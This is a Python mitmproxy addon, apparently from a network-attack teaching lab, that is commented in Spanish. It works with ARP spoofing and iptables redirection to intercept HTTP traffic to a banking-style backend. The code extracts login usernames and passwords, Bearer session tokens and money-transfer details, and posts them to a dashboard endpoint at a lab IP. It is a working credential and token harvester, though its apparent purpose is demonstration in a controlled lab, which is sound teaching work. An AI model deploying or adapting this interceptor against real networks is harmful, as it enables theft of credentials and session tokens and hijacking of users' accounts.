"""
Addon de mitmproxy: puente Kali -> Backend (Fase 6 del laboratorio).

start-attack.sh corre mitmdump en modo transparente cargando este addon.
Cada vez que mitmproxy ve pasar una peticion HTTP hacia el backend
(gracias al ARP spoofing + la regla de iptables que redirige el trafico
hacia el puerto local de mitmproxy), este addon manda un resumen del
evento al propio backend via POST /api/events. El backend lo guarda y
lo retransmite por WebSocket a quien tenga abierto el dashboard.

Uso (lo hace start-attack.sh, no hace falta correrlo a mano):
    mitmdump --mode transparent -s mitm_bridge.py
"""

import json
import os
import threading
import urllib.request

from mitmproxy import http

BACKEND_EVENTS_URL = os.environ.get("BACKEND_EVENTS_URL", "http://192.168.56.20:4000/api/events")


def _post_event(event: dict) -> None:
    body = json.dumps(event).encode("utf-8")
    request = urllib.request.Request(
        BACKEND_EVENTS_URL,
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        urllib.request.urlopen(request, timeout=2)
    except Exception as error:
        # El ataque no debe frenarse si el backend no responde a tiempo.
        print(f"[mitm_bridge] no se pudo enviar el evento al dashboard: {error}")


def _send_async(event: dict) -> None:
    threading.Thread(target=_post_event, args=(event,), daemon=True).start()


def _client_ip(flow: http.HTTPFlow) -> str:
    peer = getattr(flow.client_conn, "peername", None) or getattr(flow.client_conn, "address", None)
    return peer[0] if peer else "desconocido"


def _response_text(flow: http.HTTPFlow) -> str:
    if flow.response is None:
        return ""
    try:
        return flow.response.get_text() or ""
    except ValueError:
        return ""


def request(flow: http.HTTPFlow) -> None:
    source_ip = _client_ip(flow)
    target_ip = flow.request.host

    if flow.request.method == "POST" and flow.request.path.startswith("/api/login"):
        try:
            payload = json.loads(flow.request.get_text() or "{}")
        except ValueError:
            payload = {}
        username = str(payload.get("username", "?"))
        password = str(payload.get("password", "?"))
        _send_async(
            {
                "type": "http-credentials",
                "sourceIp": source_ip,
                "targetIp": target_ip,
                "summary": f'Login interceptado: usuario "{username}"',
                "detail": {"username": username, "password": password},
            }
        )
        return

    if flow.request.path.startswith("/api/profile"):
        auth_header = flow.request.headers.get("Authorization", "")
        token = auth_header.replace("Bearer ", "").strip()
        if token:
            _send_async(
                {
                    "type": "token-replay",
                    "sourceIp": source_ip,
                    "targetIp": target_ip,
                    "summary": "Token de sesion interceptado",
                    "detail": {"token": token},
                }
            )
            return

    if flow.request.method == "POST" and flow.request.path.startswith("/api/transfer"):
        # No mandamos el evento todavia: esperamos a la respuesta
        # (response()) para saber si la transferencia se completo y
        # con que saldos, no solo lo que pidio el cliente.
        return

    _send_async(
        {
            "type": "http-request",
            "sourceIp": source_ip,
            "targetIp": target_ip,
            "summary": f"{flow.request.method} {flow.request.path}",
            "detail": {"method": flow.request.method, "path": flow.request.path},
        }
    )


def response(flow: http.HTTPFlow) -> None:
    if not (flow.request.method == "POST" and flow.request.path.startswith("/api/transfer")):
        return

    source_ip = _client_ip(flow)
    target_ip = flow.request.host

    try:
        request_payload = json.loads(flow.request.get_text() or "{}")
    except ValueError:
        request_payload = {}

    try:
        response_payload = json.loads(_response_text(flow) or "{}")
    except ValueError:
        response_payload = {}

    from_account = str(request_payload.get("fromAccountId", "?"))
    to_account = str(request_payload.get("toAccountId", "?"))
    amount = str(request_payload.get("amount", "?"))

    _send_async(
        {
            "type": "transfer-intercepted",
            "sourceIp": source_ip,
            "targetIp": target_ip,
            "summary": f"Transferencia interceptada: {from_account} -> {to_account} (${amount})",
            "detail": {
                "fromAccountId": from_account,
                "toAccountId": to_account,
                "amount": amount,
                "fromBalance": str(response_payload.get("fromBalance", "?")),
                "toBalance": str(response_payload.get("toBalance", "?")),
                "statusCode": str(flow.response.status_code if flow.response else "?"),
            },
        }
    )
